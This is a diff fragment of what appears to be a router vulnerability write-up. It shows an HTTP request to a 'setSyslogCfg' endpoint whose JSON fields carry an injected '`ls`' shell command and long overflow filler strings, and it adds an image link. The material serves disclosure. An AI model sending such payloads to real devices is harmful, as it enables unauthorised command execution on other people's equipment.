@@ -26,3 +26,5 @@ Connection: close
 
 {"topicurl": "setSyslogCfg", "enable": "`ls`", "rtLogEnabled": "wzqaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawzqaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawzqwzqwzqwzqwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "rtLogServer": "wzq\\eaaa]_aaaaaaaacaa`aaaada_bac_dab_a]a]aa\\aacbaaawunadaa`aa`_aca``aaa]a`aaacaa_aa_]a^aa^aa`da^a\\awuqwzqwzqwzlwaa`bba_ca_cedaea]aa`baaaaababaaaad]`be^^aaab^ab"}
 ```
+
+![alt text](image-3.png)
